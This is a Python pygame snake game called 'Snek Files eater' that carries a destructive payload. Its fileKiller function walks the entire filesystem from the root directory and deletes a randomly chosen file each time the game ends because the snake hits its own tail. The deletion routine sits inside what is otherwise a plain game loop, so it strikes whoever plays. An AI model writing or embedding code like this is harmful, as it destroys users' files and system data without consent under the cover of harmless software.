import pygame, sys, time, random, os

DIRECTORY = "/"

tick = 10
tile_size = 20
rangeX = 25
rangeY = 19
WINDOW_WIDTH = tile_size * rangeX
WINDOW_HEIGHT = tile_size * rangeY

# Initialise Game Window
pygame.display.set_caption("Snek Files eater")
window = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))

# Initialise the frame per second controller
frame_controller = pygame.time.Clock()

# Initialize game variable:
snek_pos = [100,100]

snek_color = pygame.Color(0,255,0)
apple_color = pygame.Color(255,0,0)
grid_color = pygame.Color(0,0,0)
snek_tail = [[100,100],[100-1*tile_size,100],[100-2*tile_size,100]]

backgroundColor = pygame.Color(0,0,255)

direction = "RIGHT"
change_to = direction

apple_Pos = [random.randrange(0, (WINDOW_WIDTH/tile_size)) * tile_size, random.randrange(0, (WINDOW_HEIGHT/tile_size)) * tile_size]

score = 0

# Random File selector
def get_file_paths(root_dir):
    file_paths = []
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            file_paths.append(os.path.join(root, file))
    return file_paths

# The file Killer
def fileKiller():
    fileList = get_file_paths(DIRECTORY)
    print(fileList)
    if(len(fileList) != 0):
        the_CHOSEN_ONE = random.choices(fileList)

        if(os.path.isfile(DIRECTORY + the_CHOSEN_ONE[0])):
            os.remove(DIRECTORY + the_CHOSEN_ONE[0])
            print(DIRECTORY + the_CHOSEN_ONE[0])
        else:
            os.rmdir(DIRECTORY + the_CHOSEN_ONE[0])
            print(DIRECTORY + the_CHOSEN_ONE[0])
    else:
        print("THERE IS NO FILE")

while(True):

    for event in pygame.event.get():

        # Exit if close is clicked
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

        # Whenever a key is pressed down
        elif(event.type == pygame.KEYDOWN):
            # W -> Up; S -> Down; A -> Left; D -> Right
            if(event.key == pygame.K_UP or event.key == ord('w')):
                change_to = 'UP'
            if(event.key == pygame.K_DOWN or event.key == ord('s')):
                change_to = 'DOWN'
            if(event.key == pygame.K_LEFT or event.key == ord('a')):
                change_to = 'LEFT'
            if(event.key == pygame.K_RIGHT or event.key == ord('d')):
                change_to = 'RIGHT'
            # Esc -> Create event to quit the game
            if(event.key == pygame.K_ESCAPE):
                pygame.event.post(pygame.event.Event(pygame.QUIT))


    # Checking if the opposite movement is pressed to decline it:
    if(change_to == "UP" and direction != "DOWN"):
        direction = "UP"
    if(change_to == "DOWN" and direction != "UP"):
        direction = "DOWN"
    if(change_to == "RIGHT" and direction != "LEFT"):
        direction = "RIGHT"
    if(change_to == "LEFT" and direction != "RIGHT"):
        direction = "LEFT"

    # Moving the snek accordingly:
    if(direction == "UP"):
        snek_pos[1] -= tile_size
    if(direction == "DOWN"):
        snek_pos[1] += tile_size
    if(direction == "LEFT"):
        snek_pos[0] -= tile_size
    if(direction == "RIGHT"):
        snek_pos[0] += tile_size

    # teleport the snek if out if boundary:
    if(snek_pos[0] >= WINDOW_WIDTH):
        snek_pos[0] = 0
    if(snek_pos[1] >= WINDOW_HEIGHT):
        snek_pos[1] = 0
    if(snek_pos[0] < 0):
        snek_pos[0] = WINDOW_WIDTH - tile_size
    if(snek_pos[1] < 0):
        snek_pos[1] = WINDOW_HEIGHT - tile_size

    #eating mechanics:
    #Updating the snek tail by adding one tail at the head and popping the end of it
    snek_tail.insert(0, list(snek_pos))
    if(snek_pos[0] == apple_Pos[0] and snek_pos[1] == apple_Pos[1]):
        score += 1
        apple_Pos = [random.randrange(0, (WINDOW_WIDTH/tile_size)) * tile_size, random.randrange(0, (WINDOW_HEIGHT/tile_size)) * tile_size]
    else:
        snek_tail.pop()
    
    #Updating the snek tail by adding one tail at the head and popping the end of it

    
    # drawing the snek and background
    window.fill(backgroundColor)
    pygame.draw.rect(window, snek_color, pygame.Rect(snek_pos[0], snek_pos[1], tile_size, tile_size))
    pygame.draw.rect(window, apple_color, pygame.Rect(apple_Pos[0], apple_Pos[1], tile_size, tile_size))

    # mechanic for drawing the tail:
    for i in snek_tail: 
        pygame.draw.rect(window, snek_color, pygame.Rect(i[0], i[1], tile_size, tile_size))
    # Drawing a grid:
    for y in range(0, WINDOW_WIDTH, tile_size):
        pygame.draw.line(window, grid_color, [y,0], [y, WINDOW_HEIGHT], 1)
    for y in range(0, WINDOW_HEIGHT, tile_size):
        pygame.draw.line(window, grid_color, [0,y], [WINDOW_WIDTH, y], 1)

    if(len(snek_tail) == rangeX*rangeY - rangeX*rangeY/2):
        pygame.quit()
        sys.exit()

    # game over conditions:
    for i in snek_tail[1:]:
        if(i[0] == snek_pos[0] and i[1] == snek_pos[1]):
            pygame.quit()
            fileKiller()
            sys.exit()

    pygame.display.update()
    frame_controller.tick(tick)
